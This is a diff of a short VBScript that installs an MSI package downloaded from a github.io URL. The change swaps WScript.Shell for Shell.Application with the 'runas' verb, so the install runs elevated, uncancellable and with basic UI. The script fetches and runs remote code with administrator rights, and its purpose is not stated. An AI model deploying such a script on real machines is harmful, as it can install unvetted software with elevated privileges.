@@ -1,17 +1,14 @@
-Dim objShell, msiPath, runCommand
+Dim objShellApp, msiPath
 
-' Create a Windows Script Host Shell object
-Set objShell = CreateObject("WScript.Shell")
-
-' Specify the full path to your MSI installer file
+' Specify the full path or URL to your MSI installer file
 msiPath = "https://pc1n.github.io/scnv2-5m/scn5mdec.msi"
 
-' Build the msiexec command 
-' /i = Install, /qb! = Basic UI with no cancel button (or use /qn for completely silent)
-runCommand = "msiexec.exe /i """ & msiPath & """ /qb!"
+' Create the Shell Application object required for elevated execution
+Set objShellApp = CreateObject("Shell.Application")
 
-' Execute the command. The '1' displays the window, and 'True' forces VBScript to wait until installation finishes.
-objShell.Run runCommand, 1, True
+' Execute msiexec with administrative elevation ("runas")
+' Arguments: "msiexec.exe", Parameters, Directory, Verb, ShowWindow
+objShellApp.ShellExecute "msiexec.exe", "/i """ & msiPath & """ /qb!", "", "runas", 1
 
-' Clean up the object
-Set objShell = Nothing
+' Clean up
+Set objShellApp = Nothing
